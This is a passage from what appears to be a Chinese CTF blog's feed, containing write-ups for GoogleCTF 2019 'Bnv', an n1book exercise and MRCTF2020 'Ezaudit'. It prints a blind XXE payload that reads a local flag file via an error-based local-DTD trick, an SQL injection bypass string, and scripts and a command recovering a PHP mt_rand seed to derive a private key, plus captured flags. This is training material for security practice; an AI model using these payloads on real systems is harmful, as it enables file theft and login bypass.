punctuation">,</span>   <span class="token string">'1240'</span><span class="token punctuation">,</span>  <span class="token string">'12450'</span><span class="token punctuation">,</span>    <span class="token string">'1250'</span><span class="token punctuation">,</span>  <span class="token string">'240'</span><span class="token punctuation">,</span>   <span class="token string">'2450'</span><span class="token punctuation">,</span>   <span class="token string">'130'</span><span class="token punctuation">,</span>    <span class="token string">'1230'</span><span class="token punctuation">,</span>  <span class="token string">'1340'</span><span class="token punctuation">,</span>  <span class="token string">'13450'</span><span class="token punctuation">,</span>    <span class="token string">'1350'</span><span class="token punctuation">,</span>  <span class="token string">'12340'</span><span class="token punctuation">,</span> <span class="token string">'123450'</span><span class="token punctuation">,</span> <span class="token string">'12350'</span><span class="token punctuation">,</span>  <span class="token string">'2340'</span><span class="token punctuation">,</span>  <span class="token string">'23450'</span><span class="token punctuation">,</span> <span class="token string">'1360'</span><span class="token punctuation">,</span>    <span class="token string">'12360'</span><span class="token punctuation">,</span> <span class="token string">'24560'</span><span class="token punctuation">,</span> <span class="token string">'13460'</span><span class="token punctuation">,</span>  <span class="token string">'134560'</span><span class="token punctuation">,</span> <span class="token string">'13560'</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> blindmap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> i<span class="token punctuation">;</span>  <span class="token keyword">var</span> message_new <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> blindvalues<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    blindmap<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">]</span> <span class="token operator">=</span> blindvalues<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> message<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    message_new <span class="token operator">+=</span> blindmap<span class="token punctuation">[</span><span class="token punctuation">(</span>message<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  datasend <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token string">'message'</span><span class="token operator">:</span> message_new<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'/api/search'</span><span class="token punctuation">;</span>  xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-type'</span><span class="token punctuation">,</span> <span class="token string">'application/json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span>      <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span><span class="token function">getResponseHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span><span class="token function">getResponseHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"application/json; charset=utf-8"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">var</span> json <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'database-data'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> json<span class="token punctuation">[</span><span class="token string">'ValueSearch'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'database-data'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> e<span class="token punctuation">.</span>message<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'database-data'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>      xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>datasend<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>看到了用<code>json</code>传送数据，这样就有可能出现xxe漏洞。</p><h2 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h2><p>这里因为传送的字段名为<code>message，</code>所以将<code>a</code>改为<code>message</code>就能注入了。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">    &lt;!ENTITY % ISOamso '        &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> file SYSTEM "file:///flag">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">&amp;#x25;</span> <span class="token attr-name">eval</span> <span class="token attr-name">"&lt;!ENTITY</span> <span class="token attr-name">&amp;#x26;#x25;</span> <span class="token attr-name">error</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">&amp;#x27;test&amp;#x25;file;&amp;#x27;</span><span class="token punctuation">></span></span>">        <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;        <span class="token entity" title="&#x25;">&amp;#x25;</span>error;        '>        %local_dt        d;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>capture the flag</strong><br><img src="/2020/11/10/GoogleCTF2019-Quals-Bnv/1.png" alt="获得flag"><br>flag<br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;47c6d876-4d9f-41dc-a3f8-b6ad1ac1315e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> blindxxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj之n1book复盘</title>
      <link href="2020/11/09/n1book%E5%A4%8D%E7%9B%98/"/>
      <url>2020/11/09/n1book%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-第一章-web入门-常见的搜集"><a href="#1-第一章-web入门-常见的搜集" class="headerlink" title="1.[第一章 web入门]常见的搜集"></a>1.[第一章 web入门]常见的搜集</h2><p>先访问robots.txt，再根据提示得flag1为<code>n1book&#123;info_1</code>，<code>.index.php.swp</code>得flag3为:<code>p0rtant_hack&#125;</code>;<br>`</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> n1book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-Ezaudit</title>
      <link href="2020/11/09/MRCTF2020-Ezaudit/"/>
      <url>2020/11/09/MRCTF2020-Ezaudit/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p></p><p><font size="22" color="blue">I am waiting for you.<p></p></font></p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=184467&auto=1&height=66"></iframe><h2 id="1-源码泄露"><a href="#1-源码泄露" class="headerlink" title="1.源码泄露"></a>1.源码泄露</h2><p>首先进入主页未发现明显的异常，就是个普通的界面，这种一般就是源码泄露了，访问<code>www.zip</code>得源码如下<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$Private_key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Private_key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'*************'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'************'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$getuser</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">.</span><span class="token single-quoted-string string">';'</span><span class="token punctuation">;</span>         <span class="token variable">$link</span><span class="token operator">=</span><span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$getuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;tr>&lt;td>"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/td>&lt;td>"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/td>&lt;td>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">// genarate public_key </span><span class="token keyword">function</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$public_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//genarate private_key</span>  <span class="token keyword">function</span> <span class="token function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$private_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$Public_key</span> <span class="token operator">=</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="2-密码"><a href="#2-密码" class="headerlink" title="2.密码"></a>2.密码</h2><p>密码为从数据库查询得到的，这里可以用万能密码<code>1&#39; or &#39;1&#39; = &#39;1</code>来绕过。</p><h2 id="3-私钥"><a href="#3-私钥" class="headerlink" title="3.私钥"></a>3.私钥</h2><p>这里的私钥的生成方法如下~已经给的很详细了~，阿巴阿巴<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// genarate public_key </span><span class="token keyword">function</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$public_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//genarate private_key</span>  <span class="token keyword">function</span> <span class="token function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$private_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$Public_key</span> <span class="token operator">=</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>因为公钥私钥都是使用一个种子值来推算的，所以我们只要通过公钥逆向推出种子值，再通过种子值来推算出公钥私钥，就可以再正向推出我们的私钥了。(这就是mt_rand伪随机数的爆破原理)<br>这里用到脚本<code>php_mt_seed</code>，百度下载在kali里面make一下再使用。<br><a href="https://github.com/lepiaf/php_mt_seed">php_mt_seed工具地址</a><br>make后<br><img src="/2020/11/09/MRCTF2020-Ezaudit/1.png" alt></p><h2 id="4-php-mt-seed-之-crack"><a href="#4-php-mt-seed-之-crack" class="headerlink" title="4.php_mt_seed 之 crack"></a>4.php_mt_seed 之 crack</h2><p>这里要想用这个工具的话，得先把他给出的公钥换成可以破解的形式，转换的脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># python3</span>s <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>key <span class="token operator">=</span> <span class="token string">'KVQP0LdJKRaV3n9D'</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            m <span class="token operator">+=</span> <span class="token string">"&#123;&#125; &#123;&#125; 0 &#123;&#125; "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/09/MRCTF2020-Ezaudit/2.png" alt><br>得<br><pre class="line-numbers language-none"><code class="language-none">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><strong>然后在kali里面执行一下命令破解</strong></p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>效果如下图所示<br><img src="/2020/11/09/MRCTF2020-Ezaudit/3.png" alt></p><p>所以<code>mt_srand</code>的值为<br><pre class="line-numbers language-seed" data-language="seed"><code class="language-seed">1775196155<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>然后用下面的php代码找到<code>private_key</code>:<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">1775196155</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$public_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span 